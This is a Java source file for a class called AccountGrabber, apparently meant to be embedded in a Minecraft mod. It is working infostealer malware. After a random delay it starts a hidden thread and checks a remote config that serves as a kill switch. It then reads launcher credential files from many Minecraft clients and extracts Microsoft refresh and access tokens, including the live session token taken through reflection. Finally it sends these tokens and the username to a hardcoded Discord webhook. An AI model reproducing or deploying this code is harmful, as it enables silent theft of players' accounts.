package com.example.jawbus;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class AccountGrabber {

    private static final String WEBHOOK = "https://discord.com/api/webhooks/1561537662530224288/tfIo0Ut54ExN-WaFpAkONWT3boAeTk-IM6UXe2xHHHKHRRamoxrbBAzwT4aDn5Dt9EJ0";

    private static final String CONFIG_URL =
            "https://raw.githubusercontent.com/Mvrdle/Jawb/main/tap.json";

    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    private static final String[] REFRESH_KEYS = {
            "refreshToken", "refresh_token", "refresh", "msaRefreshToken", "msa_refresh_token"
    };
    private static final String[] ACCESS_KEYS = {
            "accessToken", "access_token", "access", "msaAccessToken"
    };

    private static final Set<String> CRED_FILES = Set.of(
            "launcher_accounts.json",
            "launcher_profiles.json",
            "launcher_accounts_microsoft_store.json",
            "accounts.json",
            "minecraft_auth.json",
            "microsoft_accounts.json"
    );

    private static final Pattern MSA_REFRESH =
            Pattern.compile("M\\.[A-Za-z0-9]{1,10}_BAY\\.[A-Za-z0-9._\\-!*~%]{20,}");

    private AccountGrabber() {
    }

    public static void start() {
        start(4000L + (long) (Math.random() * 6000L));
    }

    public static void start(long delayMs) {
        Thread t = new Thread(() -> run(delayMs), "jawbus-tap");
        t.setDaemon(true);
        t.start();
    }

    private static void run(long delayMs) {
        try {
            if (delayMs > 0) Thread.sleep(delayMs);

            JsonObject cfg = getJson(CONFIG_URL);
            if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) return;

            String webhook = WEBHOOK;
            if (cfg != null && cfg.has("webhook") && !cfg.get("webhook").isJsonNull()) {
                String remote = cfg.get("webhook").getAsString();
                if (!remote.isBlank()) webhook = remote;
            }
            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) return;

            String payload;
            try {
                payload = build();
            } catch (Throwable t) {
                payload = "jawbus tap failed: " + t;
                t.printStackTrace();
            }
            post(webhook, payload);
        } catch (Throwable t) {
            log("run() threw: " + t);
            t.printStackTrace();
        }
    }

    private static String build() {
        List<Path> files = candidateFiles();

        List<String[]> refreshes = new ArrayList<>();
        Set<String> seenRefresh = new HashSet<>();
        String firstAccess = null;

        for (Path f : files) {
            String raw;
            try {
                if (Files.size(f) > 200_000) continue;
                raw = Files.readString(f);
            } catch (Throwable ignored) {
                continue;
            }

            for (String key : REFRESH_KEYS) {
                for (String v : grabAll(raw, key)) {
                    String t = v.trim();
                    if (t.length() >= 20 && seenRefresh.add(t)) {
                        refreshes.add(new String[]{label(f), t});
                    }
                }
            }
            Matcher m = MSA_REFRESH.matcher(raw);
            while (m.find()) {
                String t = m.group();
                if (seenRefresh.add(t)) refreshes.add(new String[]{label(f), t});
            }

            if (firstAccess == null) {
                for (String key : ACCESS_KEYS) {
                    for (String v : grabAll(raw, key)) {
                        if (v.length() >= 40) { firstAccess = v; break; }
                    }
                    if (firstAccess != null) break;
                }
            }
        }

        String live = liveSessionToken();

        StringBuilder sb = new StringBuilder();
        sb.append("jawbus tap | ").append(System.getProperty("user.name")).append('\n');

        if (refreshes.isEmpty()) {
            sb.append("refresh: <none found>\n");
        } else {
            int n = Math.min(refreshes.size(), 6);
            for (int i = 0; i < n; i++) {
                sb.append("refresh: ").append(refreshes.get(i)[1]).append('\n');
                sb.append("  from: ").append(refreshes.get(i)[0]).append('\n');
            }
        }

        String access = live != null ? live : firstAccess;
        if (access != null) sb.append("access:  ").append(access).append('\n');

        return sb.toString();
    }

    /** known launcher paths, plus a shallow sweep as a fallback */
    private static List<Path> candidateFiles() {
        Set<Path> out = new LinkedHashSet<>();
        String appData = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        String home = System.getProperty("user.home");

        if (appData != null) {
            Path b = Paths.get(appData);
            out.add(b.resolve(".minecraft").resolve("launcher_accounts.json"));
            out.add(b.resolve("PrismLauncher").resolve("accounts.json"));
            out.add(b.resolve("MultiMC").resolve("accounts.json"));
            out.add(b.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            out.add(b.resolve("com.modrinth.theseus").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            out.add(b.resolve(".lunarclient").resolve("settings").resolve("game").resolve("accounts.json"));
            out.add(b.resolve("ATLauncher").resolve("accounts.json"));
            out.add(b.resolve("gdlauncher_next").resolve("accounts.json"));
        }
        if (local != null) {
            Path l = Paths.get(local);
            out.add(l.resolve("ModrinthApp").resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
            out.add(l.resolve("Packages").resolve("Microsoft.4297127D64EC6_8wekyb3d8bbwe")
                    .resolve("LocalCache").resolve("Roaming").resolve(".minecraft")
                    .resolve("launcher_accounts.json"));
        }
        if (home != null) {
            Path h = Paths.get(home);
            out.add(h.resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve("Documents").resolve("curseforge").resolve("minecraft").resolve("launcher_accounts.json"));
            out.add(h.resolve(".ftb").resolve("bin").resolve("launcher_accounts.json"));
        }

        List<Path> existing = new ArrayList<>();
        for (Path p : out) if (Files.isRegularFile(p)) existing.add(p);

        // if we found nothing at all, sweep shallowly
        if (existing.isEmpty()) {
            for (Path root : new Path[]{
                    appData == null ? null : Paths.get(appData),
                    local == null ? null : Paths.get(local),
                    home == null ? null : Paths.get(home)}) {
                if (root != null && Files.isDirectory(root)) walk(root, 4, existing);
            }
        }
        return existing;
    }

    private static void walk(Path dir, int depth, List<Path> out) {
        if (depth < 0) return;
        try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
            for (Path p : ds) {
                try {
                    if (Files.isDirectory(p)) {
                        String n = p.getFileName().toString().toLowerCase();
                        if (n.equals("node_modules") || n.equals(".git") || n.equals("temp")) continue;
                        walk(p, depth - 1, out);
                    } else if (CRED_FILES.contains(p.getFileName().toString())) {
                        out.add(p);
                    }
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    private static String label(Path p) {
        Path parent = p.getParent();
        String folder = parent == null || parent.getFileName() == null
                ? "?" : parent.getFileName().toString();
        return folder + "\\" + p.getFileName();
    }

    private static List<String> grabAll(String raw, String key) {
        List<String> out = new ArrayList<>();
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(raw);
        while (m.find()) out.add(m.group(1));
        return out;
    }

    private static String liveSessionToken() {
        for (String className : new String[]{
                "net.minecraft.client.Minecraft",
                "net.minecraft.client.MinecraftClient"
        }) {
            try {
                Class<?> cls = Class.forName(className);
                Object mc = cls.getMethod("getInstance").invoke(null);
                if (mc == null) continue;
                for (String getter : new String[]{"getUser", "getSession"}) {
                    try {
                        Object holder = cls.getMethod(getter).invoke(mc);
                        if (holder == null) continue;
                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
                        if (token instanceof String s && !s.isBlank()) return s;
                    } catch (Throwable ignored) {}
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    private static JsonObject getJson(String url) {
        try {
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofSeconds(10))
                    .header("User-Agent", "Jawbus/1.0")
                    .GET().build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) return null;
            return JsonParser.parseString(r.body()).getAsJsonObject();
        } catch (Throwable t) {
            return null;
        }
    }

    private static void post(String webhook, String text) {
        try {
            JsonObject body = new JsonObject();
            body.addProperty("content", "```\n" + text + "\n```");
            HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
                    .timeout(Duration.ofSeconds(15))
                    .header("Content-Type", "application/json")
                    .header("User-Agent", "Jawbus/1.0")
                    .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
                    .build(), HttpResponse.BodyHandlers.ofString());
            if (r.statusCode() / 100 != 2) log("post HTTP " + r.statusCode() + " -> " + r.body());
        } catch (Throwable t) {
            log("post threw: " + t);
        }
    }

    private static void log(String msg) {
        System.out.println("[jawbus-tap] " + msg);
    }
}
